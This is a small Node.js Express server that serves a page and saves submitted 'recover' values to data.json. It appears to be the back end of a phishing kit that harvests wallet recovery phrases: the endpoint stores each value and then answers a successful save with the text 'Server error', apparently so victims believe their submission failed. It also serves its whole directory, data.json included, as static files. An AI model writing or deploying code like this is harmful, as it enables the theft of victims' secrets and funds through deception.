import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files

// Serve the HTML page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// API to save data
app.post("/save-data", (req, res) => {
  const newData = req.body; // Get the data from the request body

  // Read the existing data from data.json
  const filePath = path.join(__dirname, "data.json");
  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      console.error("Error reading file:", err);
      return res.status(500).send("Error reading file");
    }

    const jsonData = JSON.parse(data);
    if (!jsonData.find((item) => item.recover === newData.recover)) {
      jsonData.push({ recover: newData.recover }); // Add the new data to the array
    }
    // Write the updated data back to data.json
    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
      if (err) {
        console.error("Error writing file:", err);
        return res.status(500).send("Error writing file");
      }
      res.status(200).send("Server error");
    });
  });
});
// Start the server
app.listen(80, () => console.log("Server running on port 80"));
